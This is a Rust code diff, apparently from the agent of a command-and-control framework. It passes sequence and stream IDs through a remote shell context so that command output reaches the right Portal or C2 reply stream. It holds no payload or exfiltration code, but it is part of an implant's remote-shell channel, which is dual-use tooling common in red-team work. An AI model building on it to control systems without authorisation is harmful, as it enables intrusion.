@@ -23,6 +23,7 @@ struct ShellContext {
     task_id: Option<i64>,
     portal_tx: Option<mpsc::Sender<Mote>>,
     stream_id: Option<String>,
+    seq_id: Option<u64>,
 }
 
 #[derive(Clone)]
@@ -34,23 +35,33 @@ impl SharedShellContext {
             task_id: None,
             portal_tx: None,
             stream_id: None,
+            seq_id: None,
         })))
     }
 
-    fn set_task(&self, task_id: i64) {
+    fn set_task(&self, task_id: i64, seq_id: u64, stream_id: String) {
         let mut ctx = self.0.lock().unwrap();
         ctx.task_id = Some(task_id);
+        ctx.seq_id = Some(seq_id);
+        ctx.stream_id = Some(stream_id);
     }
 
-    fn set_portal(&self, tx: mpsc::Sender<Mote>, stream_id: String) {
+    fn set_portal(&self, tx: mpsc::Sender<Mote>, stream_id: String, seq_id: u64) {
         let mut ctx = self.0.lock().unwrap();
         ctx.portal_tx = Some(tx);
         ctx.stream_id = Some(stream_id);
+        ctx.seq_id = Some(seq_id);
     }
 
     fn clear_task(&self) {
         let mut ctx = self.0.lock().unwrap();
         ctx.task_id = None;
+        // Should we clear seq_id/stream_id?
+        // For C2 tasks, yes.
+        // For Portal, we might want to keep the session context, but `set_portal` overwrites it anyway.
+        // Let's clear them to avoid accidental reuse for next C2 task.
+        ctx.seq_id = None;
+        ctx.stream_id = None;
     }
 }
 
@@ -90,13 +101,16 @@ impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
         // 2. Report to Portal if active
         if let Some(tx) = &ctx.portal_tx {
             let stream_id = ctx.stream_id.clone().unwrap_or_default();
+            // Use the seq_id from the incoming message to reply to the correct sequence/stream
+            let seq_id = ctx.seq_id.unwrap_or(0);
+
             let payload = ShellPayload {
                 shell_id: self.shell_id,
                 input: s.to_string(),
             };
             let mote = Mote {
                 stream_id,
-                seq_id: 0,
+                seq_id,
                 payload: Some(portal::mote::Payload::Shell(payload)),
             };
 
@@ -126,6 +140,8 @@ impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
 
         if let Some(tx) = &ctx.portal_tx {
             let stream_id = ctx.stream_id.clone().unwrap_or_default();
+            let seq_id = ctx.seq_id.unwrap_or(0);
+
             // Prefix error
             let payload = ShellPayload {
                 shell_id: self.shell_id,
@@ -133,7 +149,7 @@ impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
             };
             let mote = Mote {
                 stream_id,
-                seq_id: 0,
+                seq_id,
                 payload: Some(portal::mote::Payload::Shell(payload)),
             };
             let tx = tx.clone();
@@ -199,7 +215,7 @@ impl<T: Transport + Send + Sync + 'static> ShellManager<T> {
         let state = self.get_or_create_interpreter(shell_id);
 
         state.last_activity = Instant::now();
-        state.context.set_task(task.id);
+        state.context.set_task(task.id, task.sequence_id, task.stream_id);
 
         let _ = state.interpreter.interpret(&task.input);
 
@@ -210,11 +226,12 @@ impl<T: Transport + Send + Sync + 'static> ShellManager<T> {
         if let Some(portal::mote::Payload::Shell(shell_payload)) = mote.payload {
             let shell_id = shell_payload.shell_id;
             let stream_id = mote.stream_id.clone();
+            let seq_id = mote.seq_id;
 
             let state = self.get_or_create_interpreter(shell_id);
 
             state.last_activity = Instant::now();
-            state.context.set_portal(reply_tx, stream_id);
+            state.context.set_portal(reply_tx, stream_id, seq_id);
 
             let _ = state.interpreter.interpret(&shell_payload.input);
         }
